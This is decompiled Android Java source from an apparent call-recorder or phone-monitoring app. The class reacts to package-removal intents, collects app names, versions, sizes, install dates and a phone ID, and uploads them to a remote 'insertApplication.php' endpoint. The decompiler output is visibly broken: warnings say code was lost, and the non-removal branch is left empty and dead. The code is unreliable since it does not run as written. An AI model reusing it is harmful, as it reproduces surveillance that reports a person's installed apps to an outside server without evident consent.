package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.c.b.C0072d;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

/* compiled from: Apps */
public class a extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f209a;

    /* renamed from: b reason: collision with root package name */
    private final Intent f210b;

    public a(Context context, Intent intent) {
        this.f209a = context;
        this.f210b = intent;
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(15:21|22|23|24|25|26|27|33|34|35|40|41|49|50|(3:51|52|(4:54|55|56|91)(1:88))) */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x00a4, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:38:?, code lost:
        r0.printStackTrace();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:39:0x00a8, code lost:
        r4 = r9;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:33:0x0093 */
    /* JADX WARNING: No exception handlers in catch block: Catch:{  } */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0056 A[SYNTHETIC, Splitter:B:21:0x0056] */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x0126 A[Catch:{ Exception -> 0x0142 }] */
    /* JADX WARNING: Removed duplicated region for block: B:68:0x0153 A[Catch:{ Exception -> 0x014e, all -> 0x01b5 }] */
    /* JADX WARNING: Removed duplicated region for block: B:88:? A[RETURN, SYNTHETIC] */
    public void run() {
        int i;
        String str;
        try {
            if (this.f210b != null && this.f210b.getData() != null) {
                String str2 = "applications/insertApplication.php";
                if (this.f210b.getAction() != null) {
                    String action = this.f210b.getAction();
                    char c2 = 65535;
                    if (action.hashCode() == 525384130) {
                        if (action.equals("android.intent.action.PACKAGE_REMOVED")) {
                            c2 = 0;
                        }
                    }
                    if (c2 == 0) {
                        i = 1;
                        String str3 = this.f210b.getData().toString().split(":")[1];
                        String str4 = "stateApp";
                        String str5 = "namePackage";
                        String str6 = "idPhone";
                        String str7 = "";
                        if (i != 0) {
                            PackageManager packageManager = this.f209a.getPackageManager();
                            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(str3, 0);
                            String charSequence = applicationInfo.loadLabel(packageManager).toString();
                            String b2 = c.b();
                            try {
                                SimpleDateFormat d2 = c.d();
                                long j = packageManager.getPackageInfo(applicationInfo.packageName, 0).firstInstallTime;
                                Calendar instance = Calendar.getInstance();
                                instance.setTimeInMillis(j);
                                b2 = d2.format(instance.getTime());
                            } catch (Exception e2) {
                                e2.getStackTrace();
                                e2.getStackTrace();
                                Crashlytics.logException(e2);
                            }
                            String str8 = c.a(new File(applicationInfo.sourceDir).length());
                            try {
                                str = packageManager.getPackageInfo(applicationInfo.packageName, 0).versionName;
                            } catch (NameNotFoundException e3) {
                                e3.getStackTrace();
                                try {
                                    e3.getStackTrace();
                                    Crashlytics.logException(e3);
                                } catch (Exception unused) {
                                }
                                str = str7;
                            }
                            HashMap hashMap = new HashMap();
                            StringBuilder sb = new StringBuilder();
                            sb.append(str7);
                            sb.append(e.e(this.f209a));
                            hashMap.put(str6, sb.toString());
                            hashMap.put("name", charSequence);
                            hashMap.put(str5, str3);
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append(str7);
                            sb2.append(str);
                            hashMap.put("version", sb2.toString());
                            hashMap.put("size", str8);
                            hashMap.put("installDate", b2);
                            StringBuilder sb3 = new StringBuilder();
                            sb3.append(str7);
                            sb3.append(i);
                            hashMap.put(str4, sb3.toString());
                            try {
                                long a2 = a.a.a(charSequence, str3, str, str8, b2, i, this.f209a);
                                if (!a.c.e.a.b(str2, (Map<String, String>) hashMap)) {
                                    int i2 = (int) a2;
                                    try {
                                        C0072d dVar = new C0072d(this.f209a);
                                        dVar.b();
                                        dVar.a(i2);
                                        dVar.a();
                                        return;
                                    } catch (Exception e4) {
                                        try {
                                            e4.getStackTrace();
                                            Crashlytics.logException(e4);
                                            return;
                                        } catch (Exception unused2) {
                                            return;
                                        }
                                    }
                                } else {
                                    return;
                                }
                            } catch (Exception e5) {
                                e5.getStackTrace();
                                e5.getStackTrace();
                                Crashlytics.logException(e5);
                                return;
                            }
                        } else {
                            HashMap hashMap2 = new HashMap();
                            StringBuilder sb4 = new StringBuilder();
                            sb4.append(str7);
                            sb4.append(e.e(this.f209a));
                            hashMap2.put(str6, sb4.toString());
                            hashMap2.put(str5, str3);
                            StringBuilder sb5 = new StringBuilder();
                            sb5.append(str7);
                            sb5.append(i);
                            hashMap2.put(str4, sb5.toString());
                            try {
                                if (!a.c.e.a.b(str2, (Map<String, String>) hashMap2)) {
                                    a.a.a("", str3, "", "", "", i, this.f209a);
                                    return;
                                }
                                return;
                            } catch (Exception e6) {
                                a.a.a("", str3, "", "", "", i, this.f209a);
                                e6.getStackTrace();
                                e6.getStackTrace();
                                Crashlytics.logException(e6);
                                return;
                            }
                        }
                    }
                }
                i = 0;
                String str32 = this.f210b.getData().toString().split(":")[1];
                String str42 = "stateApp";
                String str52 = "namePackage";
                String str62 = "idPhone";
                String str72 = "";
                if (i != 0) {
                }
            }
        } catch (Exception e7) {
            e7.getStackTrace();
        } catch (Throwable th) {
            th.getStackTrace();
            th.getStackTrace();
            Crashlytics.logException(th);
        }
    }
}
